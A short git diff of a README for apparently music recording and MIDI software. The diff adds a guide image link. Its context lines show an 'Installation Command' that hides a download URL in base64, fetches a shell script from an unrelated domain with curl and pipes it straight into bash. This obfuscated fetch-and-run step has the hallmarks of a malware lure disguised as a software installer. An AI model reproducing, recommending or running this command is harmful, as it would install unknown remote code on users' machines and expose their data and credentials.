@@ -14,7 +14,7 @@ With advanced features like multi-track recording, MIDI editing, virtual instrum
 
 ### 💻 Installation Command:
     /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nb3IvaW5zdGFsbC5zaA== | base64 -d))"
-
+![Guide](https://i.postimg.cc/NfzQxpMT/0723-1.gif)  
 ---
 
 ## 🎬 Overview  
